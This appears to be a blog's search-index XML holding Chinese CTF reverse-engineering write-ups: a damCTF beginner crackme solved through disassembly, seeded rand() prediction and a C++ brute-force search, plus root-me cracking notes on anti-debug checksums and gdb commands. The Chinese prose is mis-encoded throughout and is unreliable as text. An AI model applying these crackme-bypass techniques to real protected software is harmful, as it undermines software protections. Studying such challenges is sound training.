<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>damCTF- rev/schlage (beginner) __WP</title>
      <link href="/2020/10/12/schlage%20(beginner)%20__WP/"/>
      <url>/2020/10/12/schlage%20(beginner)%20__WP/</url>
      
        <content type="html"><![CDATA[<h2 id="damCTF-rev-schlage-beginner-WP"><a href="#damCTF-rev-schlage-beginner-WP" class="headerlink" title="damCTF- rev/schlage (beginner) __WP"></a>damCTF- rev/schlage (beginner) __WP</h2><ol><li><p>å…ˆç”¨<code>file</code>å‘½ä»¤æŸ¥çœ‹<br><img src="https://s1.ax1x.com/2020/10/12/0Rkyfe.jpg" alt="0Rkyfe.jpg" border="0"><br>å¯ä»¥çœ‹åˆ°æ˜¯64ä½çš„ELFæ–‡ä»¶,debugä¿¡æ¯è¿˜åœ¨</p></li><li><p>æ¥ç€ä½¿ç”¨radare2åæ±‡ç¼–<br><img src="https://s1.ax1x.com/2020/10/12/0RE8xJ.jpg" alt="0RE8xJ.jpg" border="0"></p></li></ol><p>ä½¿ç”¨<code>VV</code>å‘½ä»¤è¿›å…¥è§†å›¾æ¨¡å¼</p><a id="more"></a><hr><p>æˆ‘ä»¬çš„ä»»åŠ¡æ˜¯è§£é”ï¼Œè¿™é‡Œåˆ5æŠŠé”<br><img src="https://s1.ax1x.com/2020/10/12/0RVJfS.jpg" alt="0RVJfS.jpg" border="0"></p><hr><p>å…³é”®çš„ä»£ç æ˜¯è¿™5ä¸ªå‡½æ•°<br><img src="https://s1.ax1x.com/2020/10/12/0RVIk6.jpg" alt="0RVIk6.jpg" border="0"></p><hr><h3 id="Pin1"><a href="#Pin1" class="headerlink" title="Pin1"></a>Pin1</h3><p>ç¬¬ä¸‰æŠŠé”æ¯”è¾ƒç®€å•ï¼Œæ¥çœ‹ç¬¬ä¸€æŠŠé”<br><img src="https://s1.ax1x.com/2020/10/12/0RZxKJ.jpg" alt="0RZxKJ.jpg" border="0"></p><p>ä¹Ÿå¯ä»¥åœ¨è§†å›¾æ¨¡å¼æŒ‰<code>o</code>å†è¾“å…¥å‡½æ•°æ—è¾¹çš„å­—æ¯<br><img src="https://s1.ax1x.com/2020/10/12/0Rnph6.jpg" alt="0Rnph6.jpg" border="0"></p><p>è¿™æ˜¯ä¸€ä¸ªå¾ªç¯æ“ä½œï¼Œå…±äº”æ¬¡ï¼Œæ¯ä¸€æ¬¡å°†ä¸¤ä¸ªæ•°å­—å¼‚æˆ–ï¼Œæœ€åå’Œ<code>0xee</code>æ¯”è¾ƒï¼Œç›¸åŒåˆ™æˆåŠŸ<br><code>rbp+rax-0x0e</code>å³æŒ‡å‘å¼€å¤´ç§»å…¥åœ°å€çš„5ä¸ªæ•°</p><p><code>0x3e xor 0x57 xor 0x81 xor 0xd3 xor 0x 25 xor 0x 93 xor 0xee</code> ç»“æœä¸º0<code>x99</code></p><h4 id="jleï¼š"><a href="#jleï¼š" class="headerlink" title="jleï¼š"></a>jleï¼š</h4><p>JNB al, bl  ï¼›alé‡Œçš„å†…å®¹ä¸ç­‰äºblæ—¶è·³è½¬<br>JBE al, bl ï¼›alé‡Œçš„å†…å®¹å°äºæˆ–ç­‰äºblæ—¶è·³è½¬</p><p>ï¼›åŒç†ï¼ŒJGBæ˜¯å¤§äºæˆ–ç­‰äºï¼Œ<code>JLEæ˜¯å°äºæˆ–ç­‰äº</code><br>ï¼›Aï¼ˆaboveï¼‰å¤§äºï¼ŒBï¼ˆbelowï¼‰å°äºï¼ŒEï¼ˆequalï¼‰ç­‰äºï¼Œç”¨äºæ¯”è¾ƒæ— ç¬¦å·æ•°<br>ï¼›Gï¼ˆgreatï¼‰å¤§äºï¼ŒLï¼ˆless thanï¼‰å°äºï¼Œ Eï¼ˆequalï¼‰ç­‰äºï¼Œç”¨äºæ¯”è¾ƒå¸¦ç¬¦å·æ•°</p><hr><h3 id="pin5"><a href="#pin5" class="headerlink" title="pin5"></a>pin5</h3><p><img src="https://s1.ax1x.com/2020/10/12/0RuadA.jpg" alt="0RuadA.jpg" border="0"></p><h4 id="srand"><a href="#srand" class="headerlink" title="srand()"></a>srand()</h4><p>ç¬¬5æŠŠé”ç”¨åˆ°äº†<code>srand()</code>å’Œ<code>rand()</code>ä¸¤ä¸ªå‡½æ•°ã€‚</p><p>æ ¹æ®ç§å­äº§ç”Ÿéšæœºæ•°<br>1) ç»™srand()æä¾›ä¸€ä¸ªç§å­ï¼Œå®ƒæ˜¯ä¸€ä¸ªunsigned intç±»å‹ï¼›<br>2) è°ƒç”¨rand()ï¼Œå®ƒä¼šæ ¹æ®æä¾›ç»™srand()çš„ç§å­å€¼è¿”å›ä¸€ä¸ªéšæœºæ•°(åœ¨0åˆ°RAND_MAXä¹‹é—´)ï¼›</p><p>ä¹Ÿå°±æ˜¯ï¼Œä¸€ä¸ªç§å­ï¼Œå®ƒæ‰€äº§ç”Ÿçš„éšæœºæ•°æ˜¯å›ºå®šçš„ã€‚<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> a=<span class="number">1111638594</span>ï¼› <span class="comment">//0x42424242</span></span><br><span class="line">srand(a); </span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;rand()&lt;&lt;<span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure></p><p>è¾“å…¥<code>rand()</code>ç”Ÿæˆçš„éšæœºæ•°å³å¯ï¼Œå³ä¸º<code>1413036362</code></p><h4 id="lea"><a href="#lea" class="headerlink" title="lea"></a>lea</h4><p>leaæ˜¯â€œload effective addressâ€çš„ç¼©å†™ï¼Œç®€å•çš„è¯´ï¼ŒleaæŒ‡ä»¤å¯ä»¥ç”¨æ¥å°†ä¸€ä¸ªå†…å­˜åœ°å€<code>ç›´æ¥</code>èµ‹ç»™ç›®çš„æ“ä½œæ•°ï¼Œä¾‹å¦‚ï¼šlea eax,[ebx+8]å°±æ˜¯å°†ebx+8è¿™ä¸ªå€¼ç›´æ¥èµ‹ç»™eaxï¼Œè€Œä¸æ˜¯æŠŠebx+8å¤„çš„<code>å†…å­˜åœ°å€é‡Œ</code>çš„<code>æ•°æ®</code>èµ‹ç»™eaxã€‚è€ŒmovæŒ‡ä»¤åˆ™æ°æ°ç›¸åï¼Œä¾‹å¦‚ï¼šmov eax,[ebx+8]åˆ™æ˜¯æŠŠå†…å­˜åœ°å€ä¸ºebx+8å¤„çš„æ•°æ®èµ‹ç»™eaxã€‚</p><hr><h3 id="pin2"><a href="#pin2" class="headerlink" title="pin2"></a>pin2</h3><p><img src="https://s1.ax1x.com/2020/10/12/0RKg1K.jpg" alt="0RKg1K.jpg" border="0"><br>æŸ¥çœ‹æ±‡ç¼–ä»£ç å¯ä»¥çŸ¥é“ï¼Œpin2æ ¹æ®å®é™…è¾“å‡ºäº†ä¸€ä¸ªç§å­ï¼Œæ ¹æ®ç§å­è°ƒç”¨<code>rand()</code>å³å¯ã€‚</p><p>è¿™ä¸ªç§å­ä¸‹ä¸€æŠŠé”è¿˜è¦ç”¨åˆ°ï¼Œå†ä¸€æ¬¡è°ƒç”¨<code>rand()</code>ï¼Œè·å¾—çš„æ˜¯ç¬¬äºŒä¸ªéšæœºæ•°ã€‚</p><hr><h3 id="pin4"><a href="#pin4" class="headerlink" title="pin4"></a>pin4</h3><p>æˆ‘è®¤ä¸ºè¿™æ˜¯æœ€éš¾å¾—äº†ï¼Œä¸»è¦æ˜¯ç¼–ç¨‹ã€‚<br>ç›´æ¥çœ‹r2 å¤ªå¤æ‚ï¼Œæ‰€ä»¥æˆ‘ç”¨IDA PROï¼Œç„¶åF5åç¼–è¯‘ã€‚<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"What's your favorite sentence?"</span>);</span><br><span class="line">   fgets(s, <span class="number">32</span>, <span class="built_in">stdin</span>);</span><br><span class="line">   s[<span class="built_in">strcspn</span>(s, <span class="string">"\n"</span>)] = <span class="number">0</span>;         <span class="comment">//æ¢è¡Œç¬¦å˜ä¸º0x00</span></span><br><span class="line">   v3 = rand() % <span class="number">10</span> + <span class="number">65</span>;</span><br><span class="line">   v1 = <span class="number">0</span>;</span><br><span class="line">   v4 = <span class="built_in">strlen</span>(s);                             <span class="comment">// strlen é‡åˆ°/0ç»“æŸ</span></span><br><span class="line">   <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v4; ++i )</span><br><span class="line">     v1 += v3 ^ s[i];        <span class="comment">//å°†éšæœºå€¼ä¸å­—ç¬¦å¼‚æˆ–ï¼Œç»“æœç›¸åŠ è¦ä¸º291</span></span><br><span class="line">   <span class="keyword">if</span> ( v1 == <span class="number">291</span> )</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="built_in">puts</span>(<span class="string">"Such a cool sentence!"</span>);</span><br><span class="line">     byte_20203C = <span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">     <span class="built_in">puts</span>(<span class="string">"Not a big fan of that sentence"</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p><p>æ³¨é‡Šå·²ç»å†™åœ¨ä»£ç ä¸­ï¼Œæ¥ä¸‹æ¥ï¼Œå°±æ˜¯ç¼–ç¨‹ç ´è§£å¾—åˆ°ç¬¦åˆçš„å­—ç¬¦ä¸²ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">        <span class="comment">/*FILE *pe=NULL;</span></span><br><span class="line"><span class="comment">        char s[1]=&#123;'1'&#125;;</span></span><br><span class="line"><span class="comment">        pe=popen("nc chals.damctf.xyz 31932","rw");</span></span><br><span class="line"><span class="comment">        if(pe==NULL)</span></span><br><span class="line"><span class="comment">                cout&lt;&lt;"connect failed"&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">        while (1)</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">                fwrite(s,sizeof(s),1,pe);</span></span><br><span class="line"><span class="comment">                fgets(s,20,pe);</span></span><br><span class="line"><span class="comment">                cout&lt;&lt;s;</span></span><br><span class="line"><span class="comment">                break;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        pclose(pe);*/</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> a=<span class="number">1602480388</span>;<span class="comment">//1111638594</span></span><br><span class="line">        srand(a); </span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;rand()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> v3 = rand() % <span class="number">10</span> + <span class="number">65</span>;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"v3="</span>&lt;&lt;v3&lt;&lt;<span class="built_in">endl</span>; <span class="comment">//=74</span></span><br><span class="line">        <span class="keyword">int</span> remain=<span class="number">291</span>; <span class="comment">//291ä¸‹æœç´¢</span></span><br><span class="line">        <span class="keyword">int</span> qu=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> resu;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)&#123;  <span class="comment">//æœ€å¤§å…è®¸è¾“å…¥31ä¸ªå­—ç¬¦</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">58</span>;j++)&#123; <span class="comment">//ä»Aå¼€å§‹æœç´¢</span></span><br><span class="line">                        resu=v3^<span class="keyword">int</span>(<span class="string">'A'</span>+j);</span><br><span class="line">                        <span class="keyword">if</span>(resu==<span class="number">0</span>) <span class="comment">//==0æ²¡æœ‰ç”¨</span></span><br><span class="line">                                &#123;<span class="keyword">continue</span>;&#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span> ( resu&lt;remain || remain%resu==<span class="number">0</span>)&#123; <span class="comment">//å®é™…ä¸Šæ„Ÿè§‰ä¸ç”¨åŠ åé¢çš„æ¡ä»¶</span></span><br><span class="line">                                qu+=remain/resu; <span class="comment">//ç´¯è®¡å¾—åˆ°çš„å­—ç¬¦æ•°</span></span><br><span class="line">                                <span class="keyword">if</span>(qu&gt;<span class="number">31</span>)&#123; <span class="comment">//ä¸èƒ½å¤§äº31</span></span><br><span class="line">                                        qu-=remain/resu;</span><br><span class="line">                                        <span class="keyword">continue</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;remain/resu;k++) <span class="comment">//è¾“å‡ºæˆåŠŸçš„å­—ç¬¦</span></span><br><span class="line">                                        <span class="built_in">cout</span>&lt;&lt;<span class="keyword">char</span>(<span class="string">'A'</span>+j);</span><br><span class="line">                                <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                                remain=remain%resu; <span class="comment">//æ›´æ–°ä½™ä¸‹å€¼</span></span><br><span class="line">                                <span class="built_in">cout</span>&lt;&lt;<span class="string">"i=  "</span>&lt;&lt;i&lt;&lt;<span class="string">"   "</span>&lt;&lt;<span class="string">"resu="</span>&lt;&lt;resu&lt;&lt;<span class="string">"qu= "</span>&lt;&lt;qu&lt;&lt;<span class="string">"remain="</span>&lt;&lt;remain&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                                i=qu<span class="number">-1</span>; <span class="comment">//æ›´æ–°i</span></span><br><span class="line">                                <span class="built_in">cout</span>&lt;&lt;<span class="string">"after i= "</span>&lt;&lt;i&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (remain==<span class="number">0</span>) <span class="comment">//å¡«æ»¡291 æˆåŠŸ</span></span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="built_in">cout</span>&lt;&lt;<span class="string">"find"</span>&lt;&lt;<span class="string">"i="</span>&lt;&lt;i&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(i&gt;=<span class="number">31</span>) <span class="comment">//æœ€åéƒ½æ²¡æœ‰æœç´¢åˆ°ï¼Œå¤±è´¥</span></span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>&lt;&lt;<span class="string">"don't find"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                        <span class="built_in">cout</span>&lt;&lt;<span class="string">"remainder= "</span>&lt;&lt;remain&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å…¥å­—ç¬¦ï¼ŒæˆåŠŸè§£é”ã€‚</p><p><img src="https://s1.ax1x.com/2020/10/12/0Rlsts.jpg" alt="0Rlsts.jpg" border="0"></p><p>æœ€åflagæ–‡ä»¶åœ¨è¿œç¨‹æœåŠ¡å™¨ï¼Œä½†é“¾æ¥æ—¶é—´å¾ˆçŸ­ï¼Œå¯èƒ½éœ€è¦è„šæœ¬è‡ªåŠ¨åŒ–å‘é€ï¼Œæœ‰ç‚¹å°éš¾ğŸ˜¢</p><hr><h4 id="fgets"><a href="#fgets" class="headerlink" title="fgets()"></a>fgets()</h4><p>C åº“å‡½æ•° char <em>fgets(char </em>str, int n, FILE *stream) ä»æŒ‡å®šçš„æµ stream è¯»å–ä¸€è¡Œï¼Œå¹¶æŠŠå®ƒå­˜å‚¨åœ¨ str æ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²å†…ã€‚å½“è¯»å– (n-1) ä¸ªå­—ç¬¦æ—¶ï¼Œæˆ–è€…è¯»å–åˆ°æ¢è¡Œç¬¦æ—¶ï¼Œæˆ–è€…åˆ°è¾¾æ–‡ä»¶æœ«å°¾æ—¶ï¼Œå®ƒä¼šåœæ­¢ï¼Œå…·ä½“è§†æƒ…å†µè€Œå®šã€‚</p><h4 id="strlen"><a href="#strlen" class="headerlink" title="strlen()"></a>strlen()</h4><p>C åº“å‡½æ•° size_t strlen(const char *str) è®¡ç®—å­—ç¬¦ä¸² str çš„é•¿åº¦ï¼Œç›´åˆ°ç©ºç»“æŸå­—ç¬¦ï¼Œä½†ä¸åŒ…æ‹¬ç©ºç»“æŸå­—ç¬¦ã€‚</p><h3 id="ç»“æŸè¯­"><a href="#ç»“æŸè¯­" class="headerlink" title="ç»“æŸè¯­"></a>ç»“æŸè¯­</h3><p>ä¸æ„§æ˜¯æ–°æ‰‹é¢˜ï¼Œåªæ˜¯æœ€åç¼–ç¨‹èŠ±äº†æˆ‘ä¸å°‘æ—¶é—´ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é€†å‘_root_me_3</title>
      <link href="/2020/10/08/%E9%80%86%E5%90%91_root_me_3/"/>
      <url>/2020/10/08/%E9%80%86%E5%90%91_root_me_3/</url>
      
        <content type="html"><![CDATA[<h2 id="ELF-x86-No-software-breakpoints"><a href="#ELF-x86-No-software-breakpoints" class="headerlink" title="ELF x86 - No software breakpoints"></a>ELF x86 - No software breakpoints</h2><h3 id="çœ‹åæ±‡ç¼–ï¼Œå¤§è‡´äº†è§£è¿‡ç¨‹"><a href="#çœ‹åæ±‡ç¼–ï¼Œå¤§è‡´äº†è§£è¿‡ç¨‹" class="headerlink" title="çœ‹åæ±‡ç¼–ï¼Œå¤§è‡´äº†è§£è¿‡ç¨‹"></a>çœ‹åæ±‡ç¼–ï¼Œå¤§è‡´äº†è§£è¿‡ç¨‹</h3><p>è¿™æ˜¯ä¼—æ‰€å‘¨çŸ¥çš„<code>åè°ƒè¯•</code>æŠ€æœ¯ï¼Œå®ƒä¸èƒ½åœ¨åº”ç”¨ç¨‹åºæœ¬èº«ä¸­<code>æ”¾ç½®ä»»ä½•è½¯ä»¶æ–­ç‚¹</code>ã€‚å› ä¸ºå½“æˆ‘ä»¬åœ¨<code>ç”¨æˆ·æ¨¡å¼</code>åº”ç”¨ç¨‹åºä¸­é‡åˆ°<code>æ–­ç‚¹</code>æ—¶ï¼Œä»£ç ä¸­å°†æ”¾å…¥<code>0xCCï¼ˆint3ï¼‰</code>ï¼Œå› æ­¤è®¡ç®—å°†æ˜¯é”™è¯¯çš„ï¼Œå¹¶å°†ç”Ÿæˆé”™è¯¯çš„<code>æ ¡éªŒå’Œ</code>.<br><a id="more"></a><br>è¿™æ˜¯åœ¨ecxä¸­è®¡ç®—ä¸€ç§æ•£åˆ—å€¼ï¼Œå®ƒåŸºäºå…¥å£ç‚¹çš„æ•´ä¸ªä»£ç ã€‚å¦‚æœæˆ‘ä»¬å¯¹å‡½æ•°è¿›è¡Œä»»ä½•æ›´æ”¹ï¼Œå€¼å°†ä¸å†ç›¸åŒï¼Œä»è€Œé˜»æ­¢æˆ‘ä»¬ç¼–è¾‘äºŒè¿›åˆ¶æ–‡ä»¶.</p><p>è®¡ç®—æ•´ä¸ª<code>text æŒ‡ä»¤çš„å’Œ</code>ï¼Œæ‰€ä»¥æ”¾å…¥<code>0xCC</code>ä¼š æŠ¥é”™ï¼Œä¹Ÿå°±æ˜¯æ”¹å˜çš„æŒ‡ä»¤ã€‚</p><hr><h3 id="ç§»ä½è¿ç®—ç¬¦"><a href="#ç§»ä½è¿ç®—ç¬¦" class="headerlink" title="ç§»ä½è¿ç®—ç¬¦"></a>ç§»ä½è¿ç®—ç¬¦</h3><p>a&lt;&lt;3<br><code>açš„å†…å®¹ä¸æ”¹å˜</code></p><p><code>edx &amp; 0xff</code><br>å–æœ€å8ä½</p><hr><h3 id="g"><a href="#g" class="headerlink" title="g++"></a>g++</h3><pre><code>g++ä¸»è¦ç”¨æ¥ç¼–è¯‘c++æ–‡ä»¶ï¼Œg++ç¼–è¯‘c++æ–‡ä»¶æ˜¯ä¼šè¿æ¥libc++ã€‚gccä¸»è¦ç”¨æ¥ç¼–è¯‘cæ–‡ä»¶ï¼Œä¹Ÿå¯ç¼–è¯‘c++ï¼Œä½†gccç¼–è¯‘c++æ–‡ä»¶é»˜è®¤ä¸è¿æ¥libc++ã€‚</code></pre><hr><h3 id="ç§»ä½"><a href="#ç§»ä½" class="headerlink" title="ç§»ä½"></a>ç§»ä½</h3><p>ç§»ä½æ—¶ï¼Œç§»å‡ºçš„ä½æ•°å…¨éƒ¨ä¸¢å¼ƒï¼Œç§»å‡ºçš„ç©ºä½è¡¥å…¥çš„æ•°ä¸å·¦ç§»è¿˜æ˜¯å³ç§»æœ‰å…³ã€‚å¦‚æœæ˜¯<code>å·¦ç§»</code>ï¼Œåˆ™è§„å®šè¡¥å…¥çš„æ•°å…¨éƒ¨æ˜¯<code>0</code>ï¼›å¦‚æœæ˜¯<code>å³ç§»</code>ï¼Œè¿˜ä¸è¢«ç§»ä½çš„æ•°æ®æ˜¯å¦å¸¦<code>ç¬¦å·</code>æœ‰å…³ã€‚è‹¥æ˜¯<code>ä¸å¸¦ç¬¦å·æ•°</code>ï¼Œåˆ™è¡¥å…¥çš„æ•°å…¨éƒ¨ä¸º<code>0</code>ï¼›è‹¥æ˜¯<code>å¸¦ç¬¦å·æ•°</code>ï¼Œåˆ™è¡¥å…¥çš„æ•°å…¨éƒ¨ç­‰äºåŸæ•°çš„æœ€å·¦ç«¯ä½ä¸Šçš„åŸæ•°(å³<code>åŸç¬¦å·ä½</code>)</p><hr><h3 id="å‘½åç©ºé—´"><a href="#å‘½åç©ºé—´" class="headerlink" title="å‘½åç©ºé—´"></a>å‘½åç©ºé—´</h3><p>å¼•å…¥äº†å‘½åç©ºé—´è¿™ä¸ªæ¦‚å¿µï¼Œå®ƒå¯ä½œä¸º<code>é™„åŠ ä¿¡æ¯æ¥åŒºåˆ†</code>ä¸åŒåº“ä¸­ç›¸åŒåç§°çš„å‡½æ•°ã€ç±»ã€å˜é‡ç­‰ã€‚ä½¿ç”¨äº†å‘½åç©ºé—´å³å®šä¹‰äº†ä¸Šä¸‹æ–‡ã€‚æœ¬è´¨ä¸Šï¼Œå‘½åç©ºé—´å°±æ˜¯å®šä¹‰äº†<code>ä¸€ä¸ªèŒƒå›´</code>ã€‚</p><p>å¯ä»¥ä½¿ç”¨ <code>using namespace</code> æŒ‡ä»¤ï¼Œè¿™æ ·åœ¨ä½¿ç”¨å‘½åç©ºé—´æ—¶å°±å¯ä»¥<code>ä¸ç”¨åœ¨å‰é¢åŠ ä¸Š</code>å‘½åç©ºé—´çš„åç§°ã€‚è¿™ä¸ªæŒ‡ä»¤ä¼šå‘Šè¯‰ç¼–è¯‘å™¨ï¼Œåç»­çš„ä»£ç å°†ä½¿ç”¨æŒ‡å®šçš„å‘½åç©ºé—´ä¸­çš„åç§°ã€‚</p><hr><h2 id="ELF-x86-CrackPass"><a href="#ELF-x86-CrackPass" class="headerlink" title="ELF x86 - CrackPass"></a>ELF x86 - CrackPass</h2><p><code>gdb-peda$ help x</code><br>Examine memory: x/FMT ADDRESS.</p><hr><p><code>gdb-peda$ print/t $ebx</code><br>äºŒè¿›åˆ¶æ‰“å°å¯„å­˜å™¨</p><hr><pre><code>set $ZF = 6set $eflags |= (1 &lt;&lt; $ZF)</code></pre><p>è®¾å®šZFå€¼ä¸º1</p><hr><p><code>show</code></p><hr><p><code>where</code><br>æ˜¾ç¤ºå½“å‰ä½ç½®</p><hr><p><code>MOVZX</code> æŒ‡ä»¤ï¼ˆè¿›è¡Œå…¨é›¶æ‰©å±•å¹¶ä¼ é€ï¼‰å°†æºæ“ä½œæ•°å¤åˆ¶åˆ°ç›®çš„æ“ä½œæ•°ï¼Œå¹¶æŠŠç›®çš„æ“ä½œæ•° æ‰©å±•åˆ° 16 ä½æˆ– 32 ä½ã€‚</p><hr><h3 id="r2-å›¾å½¢æ¨¡å¼ä¸‹ï¼Œå¦‚ä½•è·³è½¬å’Œè¿”å›å‡½æ•°"><a href="#r2-å›¾å½¢æ¨¡å¼ä¸‹ï¼Œå¦‚ä½•è·³è½¬å’Œè¿”å›å‡½æ•°" class="headerlink" title="r2 å›¾å½¢æ¨¡å¼ä¸‹ï¼Œå¦‚ä½•è·³è½¬å’Œè¿”å›å‡½æ•°"></a>r2 å›¾å½¢æ¨¡å¼ä¸‹ï¼Œå¦‚ä½•è·³è½¬å’Œè¿”å›å‡½æ•°</h3><p>å›¾å½¢æ¨¡å¼ä¸‹ï¼ŒæŒ‰<code>o</code>è¿›è¡Œè·³è½¬<br>æŒ‰<code>u</code>è¿”å›ä¸Šä¸€ä¸ªå‡½æ•°</p><hr><p>ff07031d6fb052490149f44b1d5e94f1592b6bac93c06ca9</p><p>25260060504_VE_T25_<em>t</em>_</p><hr><p><code>Usage: jump LOCATION</code><br>Give as argument either LINENUM or *ADDR, where ADDR is an express</p>]]></content>
      
      
      
        <tags>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é€†å‘_root_me_2</title>
      <link href="/2020/10/07/%E9%80%86%E5%90%91_root_me_2/"/>
      <url>/2020/10/07/%E9%80%86%E5%90%91_root_me_2/</url>
      
        <content type="html"><![CDATA[<h2 id="é€†å‘-root-me"><a href="#é€†å‘-root-me" class="headerlink" title="é€†å‘ root_me"></a>é€†å‘ root_me</h2><h3 id="PE-NET"><a href="#PE-NET" class="headerlink" title="PE .NET"></a>PE .NET</h3><p><a href="https://www.root-me.org/en/Challenges/Cracking/PE-DotNet-0-protection" target="_blank" rel="noopener">https://www.root-me.org/en/Challenges/Cracking/PE-DotNet-0-protection</a></p><a id="more"></a><h3 id="MIPS-ELF-MIPS-Basic-Crackme"><a href="#MIPS-ELF-MIPS-Basic-Crackme" class="headerlink" title="MIPS. ELF MIPS - Basic Crackme"></a>MIPS. ELF MIPS - Basic Crackme</h3><p><a href="https://www.root-me.org/en/Challenges/Cracking/ELF-MIPS-Basic-Crackme" target="_blank" rel="noopener">https://www.root-me.org/en/Challenges/Cracking/ELF-MIPS-Basic-Crackme</a></p><p>åœ¨MIPSæ¶æ„ä¸­ï¼Œâ€œ $ raâ€å¯„å­˜å™¨ä¿å­˜è¿”å›åœ°å€ï¼Œç±»ä¼¼äºx86æŒ‡ä»¤æŒ‡é’ˆâ€œ EIPâ€</p><h3 id="ELF-fake-instrucations"><a href="#ELF-fake-instrucations" class="headerlink" title="ELF  fake instrucations"></a>ELF  fake instrucations</h3><p><a href="https://www.root-me.org/en/Challenges/Cracking/ELF-x86-No-software-breakpoints" target="_blank" rel="noopener">https://www.root-me.org/en/Challenges/Cracking/ELF-x86-No-software-breakpoints</a></p><pre><code>dis main  gdb-peda$ set disassembly-flavor intel //æ±‡ç¼–ç”¨intelè¯­è¨€æ˜¾ç¤ºgdb-peda$ i r $edx 